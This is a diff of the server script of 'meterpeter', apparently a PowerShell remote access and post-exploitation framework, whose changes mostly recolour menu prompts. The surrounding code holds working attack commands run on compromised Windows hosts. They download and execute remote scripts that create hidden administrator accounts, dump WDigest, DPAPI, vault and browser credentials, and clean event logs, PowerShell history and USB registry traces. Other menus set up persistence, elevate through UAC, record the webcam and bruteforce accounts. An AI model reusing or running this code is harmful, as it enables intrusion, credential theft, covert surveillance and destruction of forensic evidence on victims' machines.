             $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/HiddenUser.ps1`" -OutFile `"`$Env:TMP\HiddenUser.ps1`"|Out-Null;powershell -WindowStyle hidden -File `$Env:TMP\HiddenUser.ps1 -Action Create -UserName $AccountName -Password $password -State $AccountState;Remove-Item -Path `$Env:TMP\HiddenUser.ps1 -Force}Else{echo `"`";echo `"    => error: Administrator privileges required!`"|Out-File `$Env:TMP\hidenUser.meterpeter;Get-Content -Path `$Env:TMP\hidenUser.meterpeter;Remove-Item -Path `$Env:TMP\hidenUser.meterpeter -Force}"
@@ -2858,7 +2881,7 @@ While($Client.Connected)
          $timestamp_choise = Read-Host;
          If($timestamp_choise -ieq "check")
          {
-            Write-Host " - File\Folder absolucte path: " -NoNewline
+            Write-Host " - File\Folder absolucte path: " -ForeGroundColor Red -NoNewline
             $FileMace = Read-Host
             If([string]::IsNullOrEmpty($FileMace))
             {
@@ -2872,7 +2895,7 @@ While($Client.Connected)
          }
          If($timestamp_choise -ieq "Modify")
          {
-            Write-Host " - The file to modify absolucte path: " -NoNewline
+            Write-Host " - The file to modify absolucte path: " -ForeGroundColor Red -NoNewline
             $FileMace = Read-Host
             Write-Host " - The Date (08 March 1999 19:19:19): " -NoNewline
             $DateMace = Read-Host
@@ -2901,8 +2924,10 @@ While($Client.Connected)
          write-host "`n`n   Modules  Description                  Privileges Required" -ForegroundColor green;
          write-host "   -------  -----------                  ------------------";
          write-host "   Query    query eventvwr logs          UserLand"
-         write-host "   Clean    clean system tracks          UserLand\Administrator";
-         write-host "   Paranoid clean tracks paranoid        UserLand\Administrator";
+         write-host "   Clean    clean system tracks          UserLand\" -NoNewline
+         write-host "Administrator" -ForegroundColor Red;
+         write-host "   Paranoid clean tracks paranoid        UserLand\" -NoNewline
+         write-host "Administrator" -ForegroundColor Red;
          write-host "   Return   Return to Server Main Menu" -ForeGroundColor yellow
          write-host "`n`n :meterpeter:Post:Artifacts> " -NoNewline -ForeGroundColor Green;
          $track_choise = Read-Host;
@@ -2913,7 +2938,7 @@ While($Client.Connected)
          }
          If($track_choise -ieq "clean")
          {
-            Write-Host " * Cleanning system tracks`n" -ForegroundColor Green;
+            Write-Host " * Cleanning remote system tracks ..`n" -ForegroundColor Green;
             $MeterClient = "$payload_name" + ".ps1" -Join ''
             $Command = "echo `"[*] Cleaning Temporary folder artifacts ..`" `> `$Env:TMP\clean.meterpeter;Remove-Item -Path `"`$Env:TMP\*`" -Include *.exe,*.bat,*.vbs,*.tmp,*.log,*.ps1,*.dll,*.lnk,*.inf,*.png,*.zip -Exclude *$MeterClient* -EA SilentlyContinue -Force -Recurse;echo `"[*] Cleaning Recent directory artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;Remove-Item -Path `"`$Env:APPDATA\Microsoft\Windows\Recent\*`" -Include *.exe,*.bat,*.vbs,*.log,*.ps1,*.dll,*.inf,*.lnk,*.png,*.txt,*.zip -Exclude desktop.ini -EA SilentlyContinue -Force -Recurse;echo `"[*] Cleaning Recent documents artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;cmd /R REG DELETE `"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs`" /f|Out-Null;cmd /R REG ADD `"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs`" /ve /t REG_SZ /f|Out-Null;echo `"[*] Cleaning DNS Resolver cache artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;cmd /R ipconfig /flushdns|Out-Null;If(Get-Command `"Clear-RecycleBin`" -EA SilentlyContinue){echo `"[*] Cleaning recycle bin folder artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;Start-Process -WindowStyle Hidden powershell -ArgumentList `"Clear-RecycleBin -Force`" -Wait}Else{echo `"[x] Cleaning recycle bin folder artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;echo `"    => Error: 'Clear-RecycleBin' not found ..`" `>`> `$Env:TMP\clean.meterpeter};echo `"[*] Cleaning ConsoleHost_history artifacts ..`" `>`> `$Env:TMP\clean.meterpeter;`$CleanPSLogging = (Get-PSReadlineOption -EA SilentlyContinue).HistorySavePath;echo `"MeterPeterNullArtifacts`" `> `$CleanPSLogging;`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){echo `"[*] Cleaning Cache of plugged USB devices ..`" `>`> `$Env:TMP\clean.meterpeter;cmd /R REG DELETE `"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`" /f|Out-Null;cmd /R REG ADD `"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`" /ve /t REG_SZ /f|Out-Null;echo `"[-] Cleaning Eventvwr logfiles from snapin ..`" `>`> `$Env:TMP\clean.meterpeter;`$PSlist = wevtutil el | Where-Object {`$_ -iMatch '(AMSI/Debug|UAC|Powershell|BITS|Windows Defender|WMI-Activity/Operational|AppLocker/Exe and DLL|AppLocker/MSI and Script|TCPIP/Operational)' -and `$_ -iNotMatch '(/Admin)`$'};ForEach(`$PSCategorie in `$PSlist){wevtutil cl `"`$PSCategorie`"|Out-Null;echo `"    deleted: `$PSCategorie`" `>`> `$Env:TMP\clean.meterpeter}}Else{echo `"[X] Cleaning Eventvwr logfiles from snapin ..`" `>`> `$Env:TMP\clean.meterpeter;echo `"    => error: Administrator privileges required!`" `>`> `$Env:TMP\clean.meterpeter};Get-Content -Path `$Env:TMP\clean.meterpeter;Remove-Item -Path `$Env:TMP\clean.meterpeter -Force"
          }
@@ -2922,7 +2947,7 @@ While($Client.Connected)
             Write-Host " - Display verbose outputs? (y|n): " -NoNewline
             $StDoutStatus = Read-Host
             If($StDoutStatus -iMatch '^(y|yes|true)$'){$stdout = "True"}Else{$stdout = "False"}
-            Write-Host " - Delete Restore Points? (y|n)  : " -NoNewline
+            Write-Host " - Delete Restore Points? (y|n)  : " -ForeGroundColor Red -NoNewline
             $RPointsStatus = Read-Host;If($RPointsStatus -iMatch '^(y|yes|true)$'){$RStdout = "True"}Else{$RStdout = "False"}
             Write-Host " * Cleanning system tracks." -ForegroundColor Green
             $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/CleanTracks.ps1`" -OutFile `"`$Env:TMP\CleanTracks.ps1`"|Out-Null;powershell -exec bypass -File `$Env:TMP\CleanTracks.ps1 -CleanTracks Paranoid -Verb $stdout -DelRestore $RStdout;Remove-Item -Path `$Env:TMP\CleanTracks.ps1 -EA SilentlyContinue -Force"
@@ -2965,7 +2990,7 @@ While($Client.Connected)
                   Write-Host "   => Execution to small, defaulting to 30 seconds .." -ForegroundColor Red
                   Start-Sleep -Milliseconds 500
                }
-               write-host " - Input target ip addr: " -NoNewline
+               write-host " - Input target ip addr: " -ForeGroundColor Red -NoNewline
                $RemoteHost = Read-Host
                Write-Host " * Streaming -[ $RemoteHost ]- Desktop Live!" -ForegroundColor Green
                If(-not($RemoteHost) -or $RemoteHost -eq $null)
@@ -3049,7 +3074,7 @@ While($Client.Connected)
         $Escal_choise = Read-Host;
         If($Escal_choise -ieq "GetAdmin")
         {
-          write-host " - Input execution delay time  : " -NoNewline
+          write-host " - Input execution delay time  : " -ForeGroundColor Red -NoNewline
           $DelayTime = Read-Host
           write-host " - Max EOP (client) executions : " -NoNewline
           $ExecRatLoop = Read-Host
@@ -3057,7 +3082,7 @@ While($Client.Connected)
           $EditRatLocation = Read-Host
           If($EditRatLocation -iMatch '^(y|yes|s)$')
           {
-             write-host " - Input client remote location: " -NoNewline
+             write-host " - Input client remote location: " -ForeGroundColor Red -NoNewline
              $RatLocation = Read-Host
              If(-not($RatLocation) -or $RatLocation -eq $null)
              {
@@ -3129,13 +3154,13 @@ While($Client.Connected)
         }
         If($Escal_choise -ieq "Delete" -or $Escal_choise -ieq "del")
         {
-          Write-Host " Delete privilege escalation artifacts left behind." -ForegroundColor Green -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
+          Write-Host " Delete privilege escalation artifacts left behind." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n";
           $Command = "Stop-Process -Name cmstp -EA SilentlyContinue;Remove-Item -Path `"`$Env:TMP\*`" -Include *.log,*.ps1,*.dll,*.inf,*.bat,*.vbs -Exclude *Update-* -EA SilentlyContinue -Force|Select -SkipLast 1;echo `"   [i] meterpeter EOP artifacts successfuly deleted.`" `> logme.log;Get-Content logme.log;Remove-Item -Path logme.log";
         }
         If($Escal_choise -ieq "CmdLine")
         {
            Write-Host " * Spawn UAC gui to run cmdline elevated." -ForegroundColor Green
-           write-host " - Input cmdline to run elevated: " -NoNewline
+           write-host " - Input cmdline to run elevated: " -ForeGroundColor Red -NoNewline
            $ElevatedCmdLine = Read-Host
 
            $Command = "powershell -C `"Start-Process $Env:WINDIR\system32\cmd.exe -ArgumentList '$ElevatedCmdLine' -verb RunAs`";echo `"`n[i] Executing: '$ElevatedCmdLine'`" `> `$Env:TMP\sdhsdc.log;Get-Content `$Env:TMP\sdhsdc.log;Remove-Item -Path `"`$Env:TMP\sdhsdc.log`" -Force"
@@ -3157,12 +3182,16 @@ While($Client.Connected)
         write-host "   Target machine needs to restart (startup) to beacon home at sellected time." -ForegroundColor Yellow;
         write-host "`n`n   Modules   Description                     Privileges Required" -ForegroundColor green;
         write-host "   -------   -----------                     ------------------";
-        write-host "   Beacon    Persiste Client using startup   UserLand";
-        write-host "   ADSRUN    Persiste Client using ADS:Run   UserLand";
-        write-host "   RUNONCE   Persiste Client using REG:Run   UserLand";
-        write-host "   REGRUN    Persiste Client using REG:Run   UserLand|Administrator";
-        write-host "   Schtasks  Persiste Client using Schtasks  Administrator";
-        write-host "   WinLogon  Persiste Client using WinLogon  Administrator";
+        write-host "   Beacon" -ForegroundColor Green -NoNewline
+        write-host "    Persiste Client using Startup   UserLand";
+        write-host "   ADSRUN    Persiste Client using A.D.S.    UserLand";
+        write-host "   RUNONCE   Persiste Client using REG:HKCU  UserLand";
+        write-host "   REGRUN    Persiste Client using REG:HKLM  " -NoNewline
+        write-host "Administrator" -ForegroundColor Red
+        write-host "   Schtasks  Persiste Client using Schtasks  " -NoNewline
+        write-host "Administrator" -ForegroundColor Red
+        write-host "   WinLogon  Persiste Client using WinLogon  " -NoNewline
+        write-host "Administrator" -ForegroundColor Red
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
         write-host "`n`n :meterpeter:Post:Persistance> " -NoNewline -ForeGroundColor Green;
         $startup_choise = Read-Host;
@@ -3172,7 +3201,7 @@ While($Client.Connected)
           $BeaconTime = $Null;
           $logfile = "$IPATH"+"beacon.log";
 
-          Write-host " - Input Time (sec) to beacon home (eg: 60): " -NoNewline;
+          Write-host " - Input Time (sec) to beacon home (eg: 60): " -ForeGroundColor Red -NoNewline;
           $Delay_Time = Read-Host;
           If(-not($Delay_Time) -or $Delay_Time -lt "30"){$Delay_Time = "60"}
 
@@ -3180,7 +3209,7 @@ While($Client.Connected)
           $mSGmE = Read-Host;
           If($mSGmE -iMatch '^(y|yes)$')
           {
-             Write-host " - Input Email Address to where send msg   : " -NoNewline;
+             Write-host " - Input Email Address to where send msg   : " -ForeGroundColor Red -NoNewline;
              $OutLokAddr = Read-Host;
           }
 
@@ -3231,9 +3260,9 @@ While($Client.Connected)
 
            If($Chosen_Option -iMatch '^(create)$')
            {
-              Write-host " - Input 'Update-KB5005101.ps1' absoluct path     : " -NoNewline;
+              Write-host " - Input 'Update-KB5005101.ps1' absoluct path     : " -ForeGroundColor Red -NoNewline;
               $Client_name = Read-Host;
-              Write-host " - Input image(.png|.jpg|.jpeg) absoluct path     : " -NoNewline;
+              Write-host " - Input image(.png|.jpg|.jpeg) absoluct path     : " -ForeGroundColor Red -NoNewline;
               $Image_name = Read-Host;
 
               If($Client_name -iMatch '\\' -and $Image_name -iMatch '\\')
@@ -3269,7 +3298,7 @@ While($Client.Connected)
            }
            ElseIf($Chosen_Option -iMatch '^(find)$')
            {
-              Write-host " - The directory to start search for `$DATA stream : " -NoNewline;
+              Write-host " - The directory to start search for `$DATA stream : " -ForeGroundColor Red -NoNewline;
               $StartDir = Read-Host;           
               
               If(-not($StartDir) -or $StartDir -ieq $null){$StartDir = "$Env:USERPROFILE"}
@@ -3279,7 +3308,7 @@ While($Client.Connected)
            }
            ElseIf($Chosen_Option -iMatch '^(clean)$')
            {
-              Write-host " - Input 'payload.extension' name (stream)        : " -NoNewline;
+              Write-host " - Input 'payload.extension' name (stream)        : " -ForeGroundColor Red -NoNewline;
               $streamdata = Read-Host;
               Write-host " - Input image(.png|.jpg|.jpeg) absoluct path     : " -NoNewline;
               $Image_name = Read-Host;$ParseThisShit = $Image_name.Split('\\')[-1]
@@ -3319,9 +3348,9 @@ While($Client.Connected)
         {
           $onjuyhg = ([char[]]([char]'A'..[char]'Z') + 0..9 | sort {get-random})[0..7] -join '';
           write-host " * Make Client Beacon Home Every xx Minuts." -ForegroundColor Green;Start-Sleep -Seconds 1;
-          write-Host " - Input Client Remote Path: " -NoNewline;
+          write-Host " - Input Client Remote Path: " -ForeGroundColor Red -NoNewline;
           $execapi = Read-Host;
-          write-Host " - Input Beacon Interval (minuts): " -NoNewline;
+          write-Host " - Input Beacon Interval (minuts): " -ForeGroundColor Red -NoNewline;
           $Interval = Read-Host;write-host "`n";
           Write-Host "   TaskName   Client Remote Path" -ForeGroundColor green;
           Write-Host "   --------   ------------------";
@@ -3360,7 +3389,8 @@ While($Client.Connected)
         write-host "   -------    -----------                 -------------------";
         write-host "   Device     List all camera devices     UserLand";
         write-host "   SnapShot   Capture webcam screenshot   UserLand";
-        write-host "   WebCamAvi  Webcam live stream [.avi]   UserLand";
+        write-host "   WebCamAvi  Webcam live stream [.avi]   " -NoNewline
+        write-host "Administrator" -ForegroundColor Red
         write-host "   Return     Return to Server Main Menu" -ForeGroundColor yellow;
         write-host "`n`n :meterpeter:Post:Cam> " -NoNewline -ForeGroundColor Green;
         $Cam_choise = Read-Host;
@@ -3383,7 +3413,7 @@ While($Client.Connected)
         {
            write-host " * Live stream using default webcam." -ForeGroundColor Green
 
-           write-host " - Time to record vid in seconds: " -NoNewline;
+           write-host " - Time to record vid in seconds: " -ForeGroundColor Red -NoNewline;
            [int]$RecTime = Read-Host
            If([int]$RecTime -lt 10 -or [int]$RecTime -gt 120)
            {
@@ -3391,11 +3421,11 @@ While($Client.Connected)
               write-host "   => Error: wrong input, default to $RecTime (sec)" -ForeGroundColor red      
            }
 
-           write-host " - Silent install dependencies missing? (y|n): " -ForegroundColor DarkYellow -NoNewline
+           write-host " - Silent install dependencies missing? (y|n): " -ForegroundColor Red -NoNewline
            $DependOff = Read-Host
 
            $CurrentDate = (Get-Date -Format 'HH:mm')
-           write-host " - Schedule webcam record time? ($CurrentDate|now)  : " -ForegroundColor DarkYellow -NoNewline
+           write-host " - Schedule webcam record time? ($CurrentDate|now)  : " -NoNewline
            $StartTime = Read-Host
            If([string]::IsNullOrEmpty($StartTime))
            {
@@ -3469,7 +3499,7 @@ While($Client.Connected)
       If($choise -ieq "Restart")
       {
         ## Fast restart of Remote-Host (with msgbox)
-        Write-Host " - RestartTime: " -NoNewline;
+        Write-Host " - RestartTime: " -ForeGroundColor Red -NoNewline;
         $shutdown_time = Read-Host;
 
         If(-not ($shutdown_time) -or $shutdown_time -eq " ")
@@ -3479,7 +3509,7 @@ While($Client.Connected)
           Write-Host "   ------   --------   -------";
           Write-Host "   restart  60 (sec)   A restart is required to finish install security updates.";
 
-          write-Host "`n`n - Continue? (y|n): " -ForegroundColor DarkYellow -NoNewline
+          write-Host "`n`n - Continue? (y|n): " -NoNewline
           $Continue = Read-Host
           If($Continue -iMatch '^(y|yes)$')
           {
@@ -3502,7 +3532,7 @@ While($Client.Connected)
             Write-Host "   ------   --------   -------";
             Write-Host "   restart  $shutdown_time (sec)   A restart is required to finish install security updates.";
 
-            write-Host "`n`n - Continue? (y|n): " -ForegroundColor DarkYellow -NoNewline
+            write-Host "`n`n - Continue? (y|n): " -NoNewline
             $Continue = Read-Host
             If($Continue -iMatch '^(y|yes)$')
             {
@@ -3520,7 +3550,7 @@ While($Client.Connected)
             Write-Host "   ------   --------   -------";
             Write-Host "   restart  $shutdown_time (sec)   $shutdown_msg"
 
-            write-Host "`n`n - Continue? (y|n): " -ForegroundColor DarkYellow -NoNewline
+            write-Host "`n`n - Continue? (y|n): " -NoNewline
             $Continue = Read-Host
             If($Continue -iMatch '^(y|yes)$')
             {
@@ -3549,8 +3579,10 @@ While($Client.Connected)
         write-host "   Start     Search for creds inside files  UserLand";
         write-host "   Dpapi     Dump DPAPI masterKeys + blobs  UserLand";
         write-host "   Vault     Dump creds from PasswordVault  UserLand";
-        write-host "   WDigest   Credential caching [memory]    Administrator";
-        write-host "   Browser   Clear-text credential dump     Administrator";
+        write-host "   WDigest   Credential caching [memory]    " -NoNewline
+        write-host "Administrator" -ForegroundColor Red
+        write-host "   Browser   Clear-text credential dump     " -NoNewline
+        write-host "Administrator" -ForegroundColor Red
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
         write-host "`n`n :meterpeter:Post:Pass> " -NoNewline -ForeGroundColor Green;
         $pass_choise = Read-Host;
@@ -3566,10 +3598,10 @@ While($Client.Connected)
            write-host "   execution while waiting for target user credential input,"
            write-host "   only then it resumes execution and print results onscreen`n"
 
-           write-host " - Prompt target user for credential? (yes|no): " -ForegroundColor Green -NoNewLine
+           write-host " - Prompt target user for credential? (yes|no): " -ForegroundColor Red -NoNewLine
            $PromptBox = Read-Host
 
-           write-host "   => module takes aprox 2 minuts to finish is work." -ForegroundColor DarkYellow
+           write-host "   => module takes aprox 2 minuts to finish is work." -ForegroundColor Yellow
            If(-not($PromptBox) -or ($PromptBox -iMatch '^(no|n)$'))
            {
               $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/DeviceGuard/Invoke-WDigest.ps1`" -OutFile `"`$Env:TMP\Invoke-WDigest.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\Invoke-WDigest.ps1`" -banner 'false' -wdigest 'true' -manycats;Remove-Item -Path `"`$Env:TMP\Invoke-WDigest.ps1`" -Force";
@@ -3599,7 +3631,7 @@ While($Client.Connected)
           write-host " * Search for stored credentials inside files." -ForegroundColor Green
           write-host "   Leave input fields black to use default settings." -ForegroundColor DarkYellow
 
-          write-host " - Directory to search recursive (`$Env:USERPROFILE): " -NoNewLine
+          write-host " - Directory to search recursive (`$Env:USERPROFILE): " -ForeGroundColor Red -NoNewLine
           $Recursive_search = Read-Host
 
           If(-not($Recursive_search))
@@ -3716,7 +3748,8 @@ While($Client.Connected)
          $Brute_choise = Read-Host;
          If($Brute_choise -ieq "Start")
          {
-            $UserAccountName = Read-Host " - Input Account Name";
+            Write-Host " - Input Account Name:" -ForeGroundColor Red -NoNewline
+            $UserAccountName = Read-Host
             Write-Host " * Bruteforcing user account." -ForegroundColor Green
             If(-not($UserAccountName) -or $UserAccountName -eq $null){$UserAccountName = "`$Env:USERNAME"}
 
@@ -3778,7 +3811,7 @@ While($Client.Connected)
         $Download_choise = Read-Host;
         If($Download_choise -ieq "Start")
         {
-           Write-Host " - Download Remote File: " -NoNewline;
+           Write-Host " - Download Remote File: " -ForeGroundColor Red -NoNewline;
            $File = Read-Host;
 
            If(!("$File" -like "* *") -and !([string]::IsNullOrEmpty($File)))
@@ -3817,7 +3850,7 @@ While($Client.Connected)
         $Upload_choise = Read-Host;
         If($Upload_choise -ieq "Start")
         {
-           Write-Host " - Upload Local File: " -NoNewline;
+           Write-Host " - Upload Local File: " -ForeGroundColor Red -NoNewline;
            $File = Read-Host;
 
            If(!("$File" -like "* *") -and !([string]::IsNullOrEmpty($File)))
@@ -3851,11 +3884,11 @@ While($Client.Connected)
            }
            $File = $Null;
       }
-      If($Upload_choise -ieq "Return" -or $Upload_choise -ieq "cls" -or $Upload_choise -ieq "Modules" -or $Upload_choise -ieq "clear")
-      {
-         $Command = $Null;
-         $Upload_choise = $Null;
-      }
+        If($Upload_choise -ieq "Return" -or $Upload_choise -ieq "cls" -or $Upload_choise -ieq "Modules" -or $Upload_choise -ieq "clear")
+        {
+           $Command = $Null;
+           $Upload_choise = $Null;
+        }
     }
 
     If($Command -ieq "Screenshot")
